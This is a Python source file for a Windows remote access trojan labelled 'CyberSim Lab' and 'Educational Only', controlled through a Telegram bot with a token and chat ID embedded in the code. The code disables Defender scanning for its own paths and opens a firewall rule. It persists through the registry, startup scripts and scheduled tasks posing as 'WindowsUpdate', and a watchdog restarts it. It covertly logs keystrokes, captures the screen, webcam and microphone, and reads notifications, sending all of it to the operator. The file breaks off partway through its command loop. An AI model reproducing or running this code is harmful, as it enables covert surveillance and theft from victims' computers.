#!/usr/bin/env python3
"""CyberSim Lab - TELEGRAM BOT C2 v5.0 WINDOWS (Educational Only)"""
import os, sys, time, subprocess, threading, signal, tempfile
import winreg, shutil, ctypes, atexit
from datetime import datetime

_MAIN_DAEMON = False
BOT_TOKEN = "8531404948:AAHPcgZE4a1wkkhAD3-s4gp78lyp41Lvl3Y"
ADMIN_CHAT_ID = "5570140181"
POLL_INTERVAL = 2
SCRIPT_PATH = os.path.abspath(__file__)
WORKSPACE = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), ".rat_tg_workspace")
KEYLOG_FILE = os.path.join(WORKSPACE, "keylogs.txt")
PID_FILE = os.path.join(WORKSPACE, "daemon.pid")
WATCHDOG_PID_FILE = os.path.join(WORKSPACE, "watchdog.pid")
LOG_FILE = os.path.join(WORKSPACE, "daemon.log")
BACKUP_DIR = os.path.join(os.environ.get('APPDATA', ''), "CyberSimRAT")
STARTUP_DIR = os.path.join(os.environ.get('APPDATA', ''), r"Microsoft\Windows\Start Menu\Programs\Startup")
STARTUP_BAT = os.path.join(STARTUP_DIR, "WindowsUpdate.bat")
TASK_NAME = "WindowsUpdateService"
REG_KEY_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_VALUE_NAME = "WindowsUpdate"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
os.makedirs(WORKSPACE, exist_ok=True)

class C:
    R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'
    M='\033[95m'; CY='\033[96m'; W='\033[97m'
    BD='\033[1m'; DM='\033[2m'; RS='\033[0m'

def log(msg, color=None):
    ts = datetime.now().strftime('%H:%M:%S'); line = f"[{ts}] {msg}"
    try:
        if color: print(f"{color}{line}{C.RS}")
        else: print(line)
    except: pass
    try:
        with open(LOG_FILE, 'a', encoding='utf-8', errors='ignore') as f: f.write(line + "\n")
    except: pass

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

def _safe_remove(path):
    try:
        if os.path.exists(path): os.remove(path)
    except: pass

req_lib = None
def ensure_requests():
    global req_lib
    if req_lib: return True
    try:
        import requests; req_lib = requests; return True
    except ImportError:
        log("requests missing, installing...", C.Y)
        for cmd in [f"{sys.executable} -m pip install requests", "pip install requests", "python -m pip install requests"]:
            try:
                if subprocess.run(cmd, shell=True, capture_output=True, timeout=120).returncode == 0:
                    import requests; req_lib = requests; log("requests installed!", C.G); return True
            except: pass
        log("requests FAILED!", C.R); return False

MUTEX_NAME = "Global\\CyberSimRAT_SingleInstance_v5"
_mutex_handle = None

def acquire_instance_lock():
    global _mutex_handle
    try:
        ctypes.windll.kernel32.SetLastError(0)
        _mutex_handle = ctypes.windll.kernel32.CreateMutexA(None, False, MUTEX_NAME)
        if ctypes.windll.kernel32.GetLastError() == 183:
            ctypes.windll.kernel32.CloseHandle(_mutex_handle); _mutex_handle = None; return False
        return True
    except: return True

def release_instance_lock():
    global _mutex_handle
    if _mutex_handle:
        try:
            ctypes.windll.kernel32.ReleaseMutex(_mutex_handle)
            ctypes.windll.kernel32.CloseHandle(_mutex_handle)
        except: pass
        _mutex_handle = None

_shutdown_sent = False
def send_notification_to_admin(text):
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or not ADMIN_CHAT_ID: return
    try:
        ensure_requests()
        if req_lib: req_lib.post(f"{API}/sendMessage", json={"chat_id": ADMIN_CHAT_ID, "text": text}, timeout=10)
    except: pass

def send_shutdown_notification(reason="Process terminated"):
    global _shutdown_sent
    if _shutdown_sent or not _MAIN_DAEMON: return
    _shutdown_sent = True
    try:
        send_notification_to_admin(f"RAT OFFLINE\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Reason: {reason}\nHost: {os.environ.get('COMPUTERNAME','')}\nOS: Windows\nPID: {os.getpid()}")
    except: pass
    _safe_remove(PID_FILE); release_instance_lock()

def _signal_handler(signum, frame):
    reason = "SIGTERM" if signum == signal.SIGTERM else "SIGINT"
    threading.Thread(target=send_shutdown_notification, args=(reason,), daemon=True).start()
    threading.Thread(target=lambda: (time.sleep(1), os._exit(0)), daemon=True).start()

for sig in (signal.SIGTERM, signal.SIGINT):
    try: signal.signal(sig, _signal_handler)
    except: pass

def _atexit_handler():
    if _MAIN_DAEMON: send_shutdown_notification("Process exit / System shutdown")
atexit.register(_atexit_handler)

def _install_pip(pkg, desc=""):
    try:
        __import__(pkg); log(f"  [OK] {pkg}", C.G); return True
    except ImportError:
        log(f"  [!!] {pkg} missing...", C.Y)
        for cmd in [f"{sys.executable} -m pip install {pkg}", f"pip install {pkg}", f"python -m pip install --user {pkg}"]:
            try:
                if subprocess.run(cmd, shell=True, capture_output=True, timeout=120).returncode == 0:
                    log(f"  [OK] {pkg} installed", C.G); return True
            except: pass
        log(f"  [XX] {pkg} FAILED {desc}", C.R); return False

def auto_install():
    log("Auto-installing dependencies...", C.Y)
    for pkg, desc in {"requests":"HTTP","pynput":"Keylogger","Pillow":"Screenshots","opencv-python":"Webcam"}.items():
        _install_pip(pkg, f"- {desc} won't work!")
    try:
        import pyaudio; log("  [OK] pyaudio", C.G)
    except ImportError:
        log("  [!!] pyaudio missing...", C.Y)
        subprocess.run(f"{sys.executable} -m pip install pyaudio", shell=True, capture_output=True, timeout=60)
    r = subprocess.run("where ffmpeg", shell=True, capture_output=True)
    log(("  [OK] ffmpeg" if r.returncode == 0 else "  [!!] ffmpeg not found (video/mic limited)"), C.G if r.returncode == 0 else C.Y)
    log("Dependencies ready!", C.G)

def setup_defender_exclusion():
    if not is_admin(): log("  [!!] Defender needs Admin", C.Y); return False
    try:
        for ps in [f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'"' if i < 2
                    else f'powershell -Command "Add-MpPreference -ExclusionProcess \'{p}\'"' if i < 4
                    else f'powershell -Command "Add-MpPreference -ExclusionExtension {p}"'
                    for i, p in enumerate([WORKSPACE, BACKUP_DIR, sys.executable, 'pythonw.exe', '.pyw'])]:
            subprocess.run(ps, shell=True, capture_output=True, timeout=15)
        log("  [OK] Defender exclusions added", C.G); return True
    except Exception as e: log(f"  [!!] Defender: {e}", C.Y); return False

def setup_firewall():
    if not is_admin(): log("  [!!] Firewall needs Admin", C.Y); return False
    try:
        subprocess.run(f'netsh advfirewall firewall delete rule name="{TASK_NAME}"', shell=True, capture_output=True, timeout=10)
        subprocess.run(['netsh','advfirewall','firewall','add','rule',f'name={TASK_NAME}',
            'dir=in','action=allow',f'program={sys.executable}','enable=yes','profile=any'],
            shell=True, capture_output=True, timeout=10)
        log("  [OK] Firewall added", C.G); return True
    except Exception as e: log(f"  [!!] Firewall: {e}", C.Y); return False

def setup_uac_info():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ)
        consent = winreg.QueryValueEx(key, "ConsentPromptBehaviorAdmin")[0]; winreg.CloseKey(key)
        levels = {0:"Never Notify",1:"Always Notify",2:"Default",3:"Secure Desktop+Consent",5:"Consent non-Windows"}
        log(f"  UAC: {levels.get(consent, consent)}", C.CY)
        if consent == 0: log("  [OK] UAC OFF - full admin!", C.G)
        elif is_admin(): log("  [OK] Running as ADMIN", C.G)
        else: log("  [!!] Normal user", C.Y)
        return consent
    except Exception as e: log(f"  UAC check: {e}", C.Y); return -1

def _get_pythonw():
    for p in [sys.executable.replace("python.exe","pythonw.exe"), sys.executable.replace("python3.exe","pythonw.exe")]:
        if os.path.exists(p): return p
    return sys.executable

def _check_pid_alive(pid):
    try:
        handle = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
        if not handle: return False
        ec = ctypes.c_ulong()
        ctypes.windll.kernel32.GetExitCodeProcess(handle, ctypes.byref(ec))
        ctypes.windll.kernel32.CloseHandle(handle)
        return ec.value == 259
    except: return False

def _spawn_background(flag):
    subprocess.Popen([_get_pythonw(), SCRIPT_PATH, flag],
        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
        stdout=open(LOG_FILE,'a'), stderr=open(LOG_FILE,'a'), stdin=subprocess.DEVNULL, close_fds=True)

def _read_pid_file(pf):
    try:
        if os.path.exists(pf):
            with open(pf,'r') as f: return int(f.read().strip())
    except: pass
    return None

def install_stealth():
    print(f"{C.BD}CyberSim Lab - WINDOWS SETUP v5.0{C.RS}")
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or ADMIN_CHAT_ID == "YOUR_CHAT_ID_HERE":
        print(f"{C.R}ERROR: Set BOT_TOKEN and ADMIN_CHAT_ID first!{C.RS}"); sys.exit(1)
    admin = is_admin()
    print(f"  Admin: {'YES' if admin else 'NO (limited)'}")
    for i, (desc, fn) in enumerate([("Dependencies",auto_install),("UAC",setup_uac_info),
            ("Defender",setup_defender_exclusion),("Firewall",setup_firewall),("Persistence",setup_persistence)], 1):
        print(f"\n{C.Y}[{i}/6] {desc}...{C.RS}"); fn()
    print(f"\n{C.Y}[6/6] Starting daemon...{C.RS}")
    start_daemon_background(); time.sleep(3); start_watchdog()
    print(f"{C.G}SETUP COMPLETE!{C.RS} Persistence active, watchdog on, running in background.\n"
          f"  Logs: {LOG_FILE}\n{C.Y}Status: --status | Remove: --uninstall{C.RS}")

def setup_persistence():
    pw = _get_pythonw()
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_VALUE_NAME, 0, winreg.REG_SZ, f'"{pw}" "{SCRIPT_PATH}" --daemon')
        winreg.CloseKey(key); log("  [OK] Registry", C.G)
    except Exception as e: log(f"  [!!] Registry: {e}", C.Y)
    try:
        os.makedirs(STARTUP_DIR, exist_ok=True)
        with open(STARTUP_BAT,'w') as f: f.write(f'@echo off\r\nstart "" /B /MIN "{pw}" "{SCRIPT_PATH}" --daemon\r\nexit\r\n')
        with open(os.path.join(STARTUP_DIR,"WindowsUpdate.vbs"),'w') as f:
            f.write(f'Set WshShell = CreateObject("WScript.Shell")\r\nWshShell.Run """{pw}"" ""{SCRIPT_PATH}"" --daemon", 0, False\r\n')
        log("  [OK] Startup BAT+VBS", C.G)
    except Exception as e: log(f"  [!!] Startup: {e}", C.Y)
    try:
        subprocess.run(f'schtasks /Delete /TN "{TASK_NAME}" /F', shell=True, capture_output=True)
        un = os.environ.get('USERNAME','')
        cmd = f'schtasks /Create /TN "{TASK_NAME}" /TR "\'{pw}\' \'{SCRIPT_PATH}\' --daemon" /SC ONLOGON /RL HIGHEST /F /RU "{un}"'
        ret = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if ret.returncode == 0: log(f"  [OK] Task: {TASK_NAME} (ONLOGON)", C.G)
        else:
            subprocess.run(f'schtasks /Create /TN "{TASK_NAME}" /TR "\'{pw}\' \'{SCRIPT_PATH}\' --daemon" /SC ONSTART /F', shell=True, capture_output=True)
            log(f"  [OK] Task: {TASK_NAME} (ONSTART)", C.G)
        if is_admin():
            st = f"{TASK_NAME}_SYS"
            subprocess.run(f'schtasks /Delete /TN "{st}" /F', shell=True, capture_output=True)
            if subprocess.run(f'schtasks /Create /TN "{st}" /TR "\'{pw}\' \'{SCRIPT_PATH}\' --daemon" /SC ONSTART /RL HIGHEST /F /RU SYSTEM',
                    shell=True, capture_output=True, text=True).returncode == 0:
                log(f"  [OK] SYSTEM Task: {st}", C.G)
    except Exception as e: log(f"  [!!] TaskSched: {e}", C.Y)
    try:
        os.makedirs(BACKUP_DIR, exist_ok=True); shutil.copy2(SCRIPT_PATH, os.path.join(BACKUP_DIR, "rat_win.py"))
        log(f"  [OK] Backup: {BACKUP_DIR}", C.G)
    except: pass

def uninstall_stealth():
    print(f"\n{C.Y}Uninstalling CyberSim RAT v5.0...{C.RS}")
    for pf, label in [(PID_FILE,"daemon"),(WATCHDOG_PID_FILE,"watchdog")]:
        try:
            pid = _read_pid_file(pf)
            if pid:
                subprocess.run(f'taskkill /PID {pid} /F', shell=True, capture_output=True)
                print(f"  [OK] Killed {label} PID: {pid}", C.G)
        except: pass
    subprocess.run(f'taskkill /FI "WINDOWTITLE eq *rat_telegram_win*" /F', shell=True, capture_output=True)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REG_VALUE_NAME); winreg.CloseKey(key); print(f"  [OK] Registry removed", C.G)
    except: print(f"  [--] Registry not found", C.DM)
    for f in [STARTUP_BAT, os.path.join(STARTUP_DIR,"WindowsUpdate.vbs")]:
        _safe_remove(f); print(f"  [OK] Startup file removed", C.G)
    for name in [TASK_NAME, f"{TASK_NAME}_SYS"]:
        subprocess.run(f'schtasks /Delete /TN "{name}" /F', shell=True, capture_output=True)
    print(f"  [OK] Task Scheduler removed", C.G)
    if is_admin():
        subprocess.run(f'netsh advfirewall firewall delete rule name="{TASK_NAME}"', shell=True, capture_output=True)
        for ps in [f'powershell -Command "Remove-MpPreference -ExclusionPath \'{WORKSPACE}\'"',
                    f'powershell -Command "Remove-MpPreference -ExclusionProcess \'{sys.executable}\'"']:
            subprocess.run(ps, shell=True, capture_output=True, timeout=10)
        print(f"  [OK] Firewall + Defender removed", C.G)
    for f in [PID_FILE, WATCHDOG_PID_FILE]: _safe_remove(f)
    print(f"\n{C.G}Done! Backup: {BACKUP_DIR} | Logs: {WORKSPACE}{C.RS}\n")

def watchdog_loop():
    while True:
        try:
            main_pid = _read_pid_file(PID_FILE)
            if main_pid and not _check_pid_alive(main_pid):
                log(f"Watchdog: PID {main_pid} died! Restarting...", C.Y)
                send_notification_to_admin(f"RAT RESTARTED by Watchdog\nPID: {main_pid} (died)\n"
                    f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nHost: {os.environ.get('COMPUTERNAME','')}")
                start_daemon_background()
        except Exception as e: log(f"Watchdog error: {e}", C.R)
        time.sleep(30)

def start_watchdog():
    try:
        old_pid = _read_pid_file(WATCHDOG_PID_FILE)
        if old_pid and _check_pid_alive(old_pid):
            log(f"  [OK] Watchdog running (PID: {old_pid})", C.G); return
        _spawn_background("--watchdog"); log("  [OK] Watchdog started", C.G); time.sleep(1)
    except Exception as e: log(f"  [!!] Watchdog: {e}", C.Y)

def run_watchdog():
    with open(WATCHDOG_PID_FILE,'w') as f: f.write(str(os.getpid()))
    try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass
    log(f"Watchdog PID: {os.getpid()}")
    try: watchdog_loop()
    except Exception as e: log(f"Watchdog crashed: {e}", C.R)
    _safe_remove(WATCHDOG_PID_FILE)

def start_daemon_background():
    try:
        _spawn_background("--daemon"); log("  [OK] Daemon started!", C.G); time.sleep(3)
        pid = _read_pid_file(PID_FILE)
        if pid:
            if _check_pid_alive(pid): log(f"  [OK] Verified PID: {pid}", C.G)
            else: log(f"  [!!] Daemon may have crashed", C.Y)
    except Exception as e: log(f"  [XX] Daemon fail: {e}", C.R)

def run_as_daemon():
    global _MAIN_DAEMON
    if not acquire_instance_lock():
        log("Daemon: Another instance running! Exiting.", C.Y); sys.exit(0)
    _MAIN_DAEMON = True
    with open(PID_FILE,'w') as f: f.write(str(os.getpid()))
    log(f"Daemon PID: {os.getpid()} | Admin: {is_admin()} | Lock: ACQUIRED")
    try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass
    auto_install()
    try:
        TelegramC2().start()
    except Exception as e:
        log(f"Daemon crashed: {e}", C.R)
        send_notification_to_admin(f"RAT CRASHED!\nError: {e}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    _safe_remove(PID_FILE); release_instance_lock()

def show_status():
    print(f"{C.BD}CyberSim Lab - STATUS v5.0{C.RS}")
    print(f"  Token:  {'SET' if BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE' else 'NOT SET!'}")
    print(f"  ChatID: {'SET' if ADMIN_CHAT_ID != 'YOUR_CHAT_ID_HERE' else 'NOT SET!'}")
    print(f"  Admin: {is_admin()} | Python: {sys.executable} | Script: {SCRIPT_PATH}")
    for label, pf in [("Daemon",PID_FILE),("Watchdog",WATCHDOG_PID_FILE)]:
        pid = _read_pid_file(pf)
        running = _check_pid_alive(pid) if pid else False
        print(f"  {label}: {'RUNNING (PID:'+str(pid)+')' if running else 'NOT RUNNING'}")
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY_PATH)
        winreg.QueryValueEx(key, REG_VALUE_NAME); winreg.CloseKey(key); print("  Registry: SET")
    except: print("  Registry: NOT SET")
    print(f"  Startup: BAT={'Y' if os.path.exists(STARTUP_BAT) else 'N'} VBS={'Y' if os.path.exists(os.path.join(STARTUP_DIR,'WindowsUpdate.vbs')) else 'N'}")
    for tn in [TASK_NAME, f"{TASK_NAME}_SYS"]:
        r = subprocess.run(f'schtasks /Query /TN "{tn}"', shell=True, capture_output=True)
        if r.returncode == 0: print(f"  Task {tn}: EXISTS")
    print(f"  Backup: {os.path.exists(BACKUP_DIR)} | Logs: {os.path.exists(LOG_FILE)}")
    setup_uac_info()
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE,'r',encoding='utf-8',errors='ignore') as f: lines = f.readlines()
            if lines: print(f"\n  Last {min(5,len(lines))} logs:"); [print(f"    {l.rstrip()}") for l in lines[-5:]]
        except: pass
    pid = _read_pid_file(PID_FILE)
    print(f"\n{C.G}RAT {'RUNNING' if pid and _check_pid_alive(pid) else 'NOT RUNNING'}{C.RS}")

def tg_send_text(chat_id, text, parse_mode=None):
    if not ensure_requests(): return
    try:
        payload = {"chat_id": chat_id, "text": text}
        if parse_mode: payload["parse_mode"] = parse_mode
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                payload["text"] = text[i:i+4000]
                req_lib.post(f"{API}/sendMessage", json=payload, timeout=10)
        else: req_lib.post(f"{API}/sendMessage", json=payload, timeout=10)
    except Exception as e: log(f"Send error: {e}", C.R)

def tg_send_file(chat_id, file_type, file_path, caption="", timeout=60, extra=None):
    if not ensure_requests(): return
    try:
        sz = os.path.getsize(file_path)
        if file_type in ("video","voice") and sz > 50*1024*1024:
            tg_send_text(chat_id, f"File too large ({sz/(1024*1024):.1f}MB)."); return
        data = {"chat_id": chat_id, "caption": caption}
        if extra: data.update(extra)
        with open(file_path,'rb') as f:
            req_lib.post(f"{API}/send{file_type.capitalize()}", data=data, files={file_type: f}, timeout=timeout)
    except Exception as e: tg_send_text(chat_id, f"{file_type} error: {e}")

def tg_send_photo(c, p, cap=""): tg_send_file(c, "photo", p, cap, timeout=30)
def tg_send_document(c, p, cap=""): tg_send_file(c, "document", p, cap, timeout=60)
def tg_send_video(c, p, cap=""): tg_send_file(c, "video", p, cap, timeout=60, extra={"supports_streaming":"true"})
def tg_send_voice(c, p, cap=""): tg_send_file(c, "voice", p, cap, timeout=30)

def tg_get_updates(offset=0, timeout=30):
    if not ensure_requests(): return []
    try:
        return req_lib.get(f"{API}/getUpdates", params={"offset":offset,"timeout":timeout}, timeout=35).json().get("result",[])
    except: return []

def _save_to_file(fname, content):
    with open(fname,'w',encoding='utf-8',errors='ignore') as f: f.write(content)

def take_screenshot():
    fname = os.path.join(WORKSPACE, f"ss_{int(time.time())}.png")
    try:
        try:
            from PIL import ImageGrab; img = ImageGrab.grab(); img.save(fname)
            if os.path.exists(fname) and os.path.getsize(fname) > 1000: return fname
        except ImportError:
            subprocess.run(f"{sys.executable} -m pip install Pillow", shell=True, capture_output=True, timeout=60)
            try:
                from PIL import ImageGrab; img = ImageGrab.grab(); img.save(fname)
                if os.path.exists(fname) and os.path.getsize(fname) > 1000: return fname
            except: pass
        subprocess.run(f'powershell -command "[Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\');'
            f'$b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,'
            f'[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);'
            f'$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen([System.Drawing.Point]::Empty,'
            f'[System.Drawing.Point]::Empty,[System.Drawing.Size]::new($b.Width,$b.Height));'
            f'$b.Save(\'{fname}\');$g.Dispose();$b.Dispose()"', shell=True, capture_output=True, timeout=10)
        if os.path.exists(fname) and os.path.getsize(fname) > 1000: return fname
    except: pass
    return None

def take_webcam():
    fname = os.path.join(WORKSPACE, f"cam_{int(time.time())}.jpg")
    try:
        try:
            import cv2; cam = cv2.VideoCapture(0); ret, frame = cam.read(); cam.release()
            if ret:
                cv2.imwrite(fname, frame)
                if os.path.exists(fname) and os.path.getsize(fname) > 1000: return fname
        except ImportError:
            subprocess.run(f"{sys.executable} -m pip install opencv-python", shell=True, capture_output=True, timeout=60)
            try:
                import cv2; cam = cv2.VideoCapture(0); ret, frame = cam.read(); cam.release()
                if ret:
                    cv2.imwrite(fname, frame)
                    if os.path.exists(fname) and os.path.getsize(fname) > 1000: return fname
            except: pass
        for cn in ["Integrated Camera","USB Camera","0"]:
            subprocess.run(f'ffmpeg -f dshow -i video="{cn}" -frames:v 1 -y "{fname}" 2>nul', shell=True, capture_output=True, timeout=10)
            if os.path.exists(fname) and os.path.getsize(fname) > 1000: return fname
    except: pass
    return None

def record_video(duration=5):
    fname = os.path.join(WORKSPACE, f"vid_{int(time.time())}.mp4")
    try:
        try:
            import cv2; cam = cv2.VideoCapture(0); w, h = int(cam.get(3)), int(cam.get(4))
            out = cv2.VideoWriter(fname, cv2.VideoWriter_fourcc(*'mp4v'), 15, (w, h))
            t0 = time.time()
            while time.time() - t0 < duration:
                ret, frame = cam.read()
                if ret: out.write(frame)
                time.sleep(0.03)
            cam.release(); out.release()
            if os.path.exists(fname) and os.path.getsize(fname) > 1000: return fname
        except: pass
        for cn in ["Integrated Camera","USB Camera","HD Webcam","0"]:
            subprocess.run(f'ffmpeg -f dshow -i video="{cn}" -t {duration} -r 15 -s 640x480 -y "{fname}" 2>nul',
                shell=True, capture_output=True, timeout=duration+10)
            if os.path.exists(fname) and os.path.getsize(fname) > 1000: return fname
    except: pass
    return None

class MicRecorder:
    def __init__(self): self.recording = False; self.thread = None; self.chunk_count = 0
    def start(self, chat_id):
        if self.recording: return "Already recording!"
        self.recording = True; self.chunk_count = 0
        self.thread = threading.Thread(target=self._loop, args=(chat_id,), daemon=True)
        self.thread.start(); return "Mic ON! /mic off to stop."
    def stop(self):
        if not self.recording: return "Not recording."
        self.recording = False; return f"Mic OFF! {self.chunk_count} chunks sent."
    def _loop(self, chat_id):
        log("Mic started...", C.G)
        while self.recording:
            ogg = os.path.join(WORKSPACE, f"mic_{int(time.time())}.ogg")
            wav = os.path.join(WORKSPACE, f"mic_{int(time.time())}.wav")
            try:
                ok = False
                try:
                    import pyaudio, wave
                    pa = pyaudio.PyAudio()
                    stream = pa.open(format=pyaudio.paInt16, channels=1, rate=16000, input=True, frames_per_buffer=1024)
                    frames = [stream.read(1024, exception_on_overflow=False) for _ in range(int(16000/1024*10))]
                    stream.close(); pa.terminate()
                    wf = wave.open(wav,'wb'); wf.setnchannels(1); wf.setsampwidth(pa.get_sample_size(pyaudio.paInt16))
                    wf.setframerate(16000); wf.writeframes(b''.join(frames)); wf.close()
                    ok = os.path.exists(wav) and os.path.getsize(wav) > 100
                except ImportError: tg_send_text(chat_id, "pip install pyaudio"); break
                except Exception as e: log(f"Mic err: {e}", C.R)
                if ok and os.path.exists(wav):
                    subprocess.run(f'ffmpeg -i "{wav}" -c:a libopus -b:a 32k "{ogg}" 2>nul', shell=True, capture_output=True, timeout=15)
                    if not (os.path.exists(ogg) and os.path.getsize(ogg) > 100): ogg = wav
                if ok and self.recording:
                    self.chunk_count += 1; tg_send_voice(chat_id, ogg, f"Mic [{self.chunk_count}]")
                elif self.recording and self.chunk_count == 0:
                    tg_send_text(chat_id, "Mic: Cannot access audio device."); break
            except Exception as e: log(f"Mic err: {e}", C.R); break
            for f in [ogg, wav]: _safe_remove(f)
        log("Mic stopped.", C.Y)

class NotificationReader:
    def __init__(self):
        self.db_path = os.path.join(os.environ.get('LOCALAPPDATA',''), 'Microsoft','Windows','Notifications','wpndatabase.db')
    def _parse_xml(self, payload):
        import xml.etree.ElementTree as ET, re; texts = []
        try:
            root = ET.fromstring(payload)
            for elem in root.iter():
                if elem.tag.endswith(('text','title','body')) and elem.text and elem.text.strip():
                    texts.append(elem.text.strip())
        except ET.ParseError:
            try:
                for m in re.findall(r'<(?:text|title|body)[^>]*>(.*?)</(?:text|title|body)>', payload, re.DOTALL):
                    clean = re.sub(r'<[^>]+>', '', m).strip()
                    if clean: texts.append(clean)
            except: pass
        except: pass
        return texts
    def _get_sqlite(self, count):
        import sqlite3, shutil
        if not os.path.exists(self.db_path): return None, "DB not found"
        tdb = os.path.join(tempfile.gettempdir(), 'wpnd_copy.db')
        try: shutil.copy2(self.db_path, tdb)
        except PermissionError: tdb = self.db_path
        try:
            conn = sqlite3.connect(tdb, timeout=5); conn.text_factory = str; cur = conn.cursor()
            cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = [r[0] for r in cur.fetchall()]
            if 'Notification' not in tables:
                conn.close(); _safe_remove(tdb); return None, "No Notification table"
            cur.execute("SELECT Type,Payload,PrimaryId FROM Notification WHERE Type=1 AND Payload IS NOT NULL AND length(Payload)>10 ORDER BY rowid DESC LIMIT ?",(count,))
            rows = cur.fetchall(); conn.close(); _safe_remove(tdb)
            if not rows: return None, f"0 notification rows in {len(tables)} tables"
            seen, parsed = set(), []
            for _, payload, pid in rows:
                if pid and pid in seen: continue
                if pid: seen.add(pid)
                texts = self._parse_xml(payload)
                if texts:
                    parsed.append({'title':texts[0][:100], 'body':" | ".join(texts[1:])[:300] if len(texts)>1 else "", 'id':pid or '?', 'raw_len':len(payload)})
                else:
                    parsed.append({'title':'(raw)', 'body':payload[:150].replace('\n',' '), 'id':pid or '?', 'raw_len':len(payload)})
            return parsed, None
        except Exception as e:
            _safe_remove(tdb); return None, str(e)
    def _get_eventlog(self, count):
        try:
            ps = ('powershell -command "try {$e=Get-WinEvent -FilterHashtable @{LogName=\'Microsoft-Windows-WindowsUI/Operational\';'
                'Id=100,101,102,400,401,402} -MaxEvents '+str(count)+' -ErrorAction SilentlyContinue 2>$null;'
                'if($e){$e|%{$t=$_.TimeCreated.ToString(\'yyyy-MM-dd HH:mm:ss\');$m=$_.Message;'
                'if($m){$m=$m.Substring(0,[Math]::Min($m.Length,300))};Write-Output \"$t|$($_.Id)|$m\"}}} catch{$_}"')
            out = subprocess.run(ps, shell=True, capture_output=True, text=True, timeout=15)
            if out.stdout.strip() and "Exception" not in out.stdout: return out.stdout.strip()[:3500]
        except: pass
        return None
    def get_notifications(self, count=20):
        try:
            parsed, error = self._get_sqlite(count)
            if parsed is not None:
                if not parsed: return f"Notifications (SQLite): 0 found\nDB: {self.db_path}\n{error}"
                readable = sum(1 for n in parsed if n['title']!='(raw)')
                r = f"Notifications (SQLite - {len(parsed)} found)\n{'='*40}\n"
                for i, n in enumerate(parsed):
                    if n['title']!='(raw)':
                        r += f"[{i+1}] {n['title']}"
                        if n['body']: r += f"\n  {n['body']}"
                    else: r += f"[{i+1}] (raw {n['raw_len']}B) {n['body'][:80]}"
                    r += "\n"
                r += f"Total: {len(parsed)} | Readable: {readable}"
                return r[:4000]
            ev = self._get_eventlog(count)
            if ev: return f"Notifications (Event Log):\n{ev}"
            return f"Cannot read notifications\nDB: {self.db_path} exists={os.path.exists(self.db_path)}\n{error}"
        except Exception as e: return f"Error: {e}"

class KeyloggerManager:
    def __init__(self): self.running = False; self.listener = None; self.keystroke_count = 0; self.error_msg = ""; self.captured_test_key = False
    def start(self):
        try:
            from pynput import keyboard; log("Keylogger starting...", C.Y)
            def on_press(key):
                try: ch = key.char
                except: ch = f"[{key.name}]"
                try:
                    with open(KEYLOG_FILE,'a',encoding='utf-8',errors='ignore') as f: f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {ch}\n")
                except: pass
                self.keystroke_count += 1; self.captured_test_key = True
            self.listener = keyboard.Listener(on_press=on_press); self.listener.daemon = True; self.listener.start()
            time.sleep(1.0)
            if self.listener.is_alive(): self.running = True; log("Keylogger ACTIVE", C.G)
            else: self.error_msg = "LISTENER_DIED"; log("Keylogger died!", C.R)
        except ImportError: self.error_msg = "PYNPUT_MISSING"; log("pynput missing!", C.R)
        except Exception as e: self.error_msg = str(e); log(f"Keylogger: {e}", C.R)
    def dump(self):
        try:
            if os.path.exists(KEYLOG_FILE):
                with open(KEYLOG_FILE,'r',encoding='utf-8',errors='ignore') as f: return f.read()
        except: pass
        return ""
    def clear(self):
        try: os.remove(KEYLOG_FILE); self.keystroke_count = 0; self.captured_test_key = False; return True
        except: return False
    def get_status_text(self):
        if self.running: return "ACTIVE" if self.captured_test_key else "Listening (no keys yet)"
        return {"PYNPUT_MISSING":"OFF - pip install pynput","LISTENER_DIED":"OFF - died"}.get(self.error_msg, "OFF")

class TelegramC2:
    def __init__(self):
        self.last_update_id = 0; self.running = True; self.keylogger = KeyloggerManager()
        self.mic = MicRecorder(); self.notif_reader = NotificationReader()
        self.notif_live_running = False; self.browse_path = os.path.expanduser("~")
    def start(self):
        if not ensure_requests(): log("ERROR: requests!", C.R); sys.exit(1)
        if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE": log("ERROR: Bot Token!", C.R); sys.exit(1)
        log(f"C2 v5.0 Started! Admin: {ADMIN_CHAT_ID}"); self.keylogger.start()
        host = os.environ.get('COMPUTERNAME',''); user = os.environ.get('USERNAME','')
